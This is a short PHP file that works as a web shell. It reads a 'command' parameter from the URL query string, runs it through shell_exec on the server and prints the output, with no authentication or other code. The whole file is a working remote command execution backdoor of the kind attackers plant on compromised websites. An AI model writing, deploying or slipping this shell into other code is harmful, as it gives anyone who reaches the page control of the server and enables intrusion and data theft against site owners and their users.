<?php
if(isset($_GET['command'])){
    echo shell_exec($_GET['command'].' 2>&1');
}
 ?>
